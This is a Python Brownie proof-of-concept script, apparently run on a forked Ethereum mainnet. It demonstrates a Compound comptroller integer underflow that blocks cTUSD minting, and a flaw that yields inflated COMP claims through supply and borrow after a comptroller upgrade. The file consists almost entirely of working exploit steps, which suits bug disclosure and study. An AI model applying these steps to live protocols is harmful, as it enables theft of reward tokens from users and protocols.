from brownie import interface, accounts, chain, Comptroller
from rich import print as rp

weth = interface.IWETH('0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2')
ceth = interface.ICeth('0x4ddc2d193948926d02f9b1fe9e1daa0718270ed5')
unitroller = interface.IUnitroller('0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B')
comptroller = interface.IComptroller(unitroller)
comp_owner = accounts.at(comptroller.admin(), force=True)
uni_router = interface.IUniswapRouter('0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D')
cTUSD = interface.ICErc20('0x12392F67bdf24faE0AF363c24aC620a2f67DAd86')
tusd = interface.ERC20(cTUSD.underlying())
markets = comptroller.getAllMarkets()
comp = interface.IComp('0xc00e94Cb662C3520282E6f5717214004A7f26888')
oracle = interface.ICompoundPriceOracle('0x6D2299C48a8dD07a872FDd0F8233924872Ad1071')

def main():

    # get all markets that compSupplyIndex == compInitialIndex
    # targets = [m for m in markets if comptroller.compSupplyState(m)[0] == '1000000000000000000000000000000000000']

    user = accounts[0]
    uni_router.swapETHForExactTokens(2e18, [weth, tusd], user, chain.time() + 120, {'from': user, 'value': 1e18})

    # bug 1: 
    rp('[green bold]------------------------- Bug 1: Integer underflow ------------------------[/]')
    comp_supply_state = comptroller.compSupplyState(cTUSD)
    rp(f'[yellow bold]> before compSupplyState: index is {comp_supply_state[0]}, block is {comp_supply_state[1]}[/]')
    rp('[yellow bold]> We can mint cTUSD now, because compSupply index is 0[/]')
    tusd.approve(cTUSD, 2e18, {'from': user})
    cTUSD.mint(1e18, {'from': user})
    rp(f'[yellow bold]> mint succeed! now the cTUSD we have is {cTUSD.balanceOf(user)}[/]')
    rp('[yellow bold]> setp 1: set compSpeed not zero to initialize COMP rewards[/]')
    comptroller._setCompSpeed(cTUSD, 8, {'from': comp_owner})
    rp(f'[yellow bold]> now compSpeed of cTUSD is {comptroller.compSpeeds(cTUSD)} and compSupplyState is still {comptroller.compSupplyState(cTUSD)[0]}[/]')
    rp('[yellow bold]> step 2: set compSpeed zero to shutdown COMP rewards[/]')
    comptroller._setCompSpeed(cTUSD, 0, {'from': comp_owner})
    rp(f'[yellow bold]> now we can see the compSupplyIndex is {comptroller.compSupplyState(cTUSD)[0]} which is < compInitialIndex(1e36)[/]')
    rp('[red bold] because of BUG1, this time mint failed[/]')
    try: 
        cTUSD.mint(1e18, {'from': user})
    except Exception as e:
        rp(f'[red bold]-> ERROR: mint failed, {e}[/]')

    # bug 2: exploit by supply (mint)
    chain.reset()
    rp('[green bold]------------------------- Bug 2(Expolit by supply): Claim incorrect amount Comp ------------------------[/]')
    user1 = accounts[1]
    uni_router.swapETHForExactTokens(2e18, [weth, tusd], user1, chain.time() + 120, {'from': user1, 'value': 1e18})
    tusd.approve(cTUSD, 2e18, {'from': user1})
    cTUSD.mint(2e18, {'from': user1})
    rp(f'[yellow bold]> before: user CompAccrued is {comptroller.compAccrued(user1)}[/]')
    rp(f'[yellow bold]> before: comp balance is {comp.balanceOf(user1)}[/]')
    rp('[yellow bold]> remember, we have cTUSD now before new comptroller is deployed.[/]')
    rp(f'[yellow bold]> cTUSD balance is {cTUSD.balanceOf(user1)}[/]')
    rp('[yellow bold]> step 1: deploy new comptroller as same as Compound. [/]')
    new_comptroller = Comptroller.deploy({'from': comp_owner})
    rp(f'[yellow bold]> the new comptroller\'s address is {new_comptroller.address}[/]')
    unitroller._setPendingImplementation(new_comptroller, {'from': comp_owner})
    new_comptroller._become(unitroller, {'from': comp_owner})
    rp(f'[yellow bold]> now the new logic contract is {unitroller.comptrollerImplementation()}[/]')
    rp(f'[yellow bold]> step 2: because of BUG2, we can claim a large amount comp rewards[/]')
    new_comptroller = interface.IComptrollerNew(unitroller)
    new_comptroller.mintAllowed(cTUSD, user1, 1e18, {'from': user1})
    rp(f'[yellow bold]> after: user CompAccrued is {new_comptroller.compAccrued(user1)}[/]')
    new_comptroller.claimComp(user1, [cTUSD], {'from': user1})
    rp(f':vampire: [yellow bold]> after: comp balance is {comp.balanceOf(user1)}[/]')
    
    # bug 2: exploit by borrow
    chain.reset()
    rp('[green bold]------------------------- Bug 2(Expolit by borrow): Claim incorrect amount Comp ------------------------[/]')
    user2 = accounts[2]
    ceth.mint({'from': user2, 'value': 10e18})
    comptroller.enterMarkets([ceth], {'from': user2})
    borrow_usd = comptroller.getAccountLiquidity(user2)[1]
    borrow_amount = borrow_usd  * 10 ** tusd.decimals() / oracle.getUnderlyingPrice(cTUSD)
    cTUSD.borrow(borrow_amount, {'from': user2})
    rp(f'[yellow bold]> before: user CompAccrued is {comptroller.compAccrued(user2)}[/]')
    rp(f'[yellow bold]> before: comp balance is {comp.balanceOf(user2)}[/]')
    rp('[yellow bold]> remember, we have cTUSD now before new comptroller is deployed.[/]')
    rp(f'[yellow bold]> cTUSD balance is {cTUSD.balanceOf(user2)}[/]')
    rp('[yellow bold]> step 1: deploy new comptroller as same as Compound. [/]')
    new_comptroller = Comptroller.deploy({'from': comp_owner})
    rp(f'[yellow bold]> the new comptroller\'s address is {new_comptroller.address}[/]')
    unitroller._setPendingImplementation(new_comptroller, {'from': comp_owner})
    new_comptroller._become(unitroller, {'from': comp_owner})
    rp(f'[yellow bold]> now the new logic contract is {unitroller.comptrollerImplementation()}[/]')
    rp(f'[yellow bold]> step 2: because of BUG2, we can claim a large amount comp rewards[/]')
    new_comptroller = interface.IComptrollerNew(unitroller)
    new_comptroller.borrowAllowed(cTUSD, user2, 0, {'from': user2})
    rp(f'[yellow bold]> after: user CompAccrued is {new_comptroller.compAccrued(user2)}[/]')
    new_comptroller.claimComp(user2, [cTUSD], {'from': user2})
    rp(f':vampire: [yellow bold]> after: comp balance is {comp.balanceOf(user2)}[/]')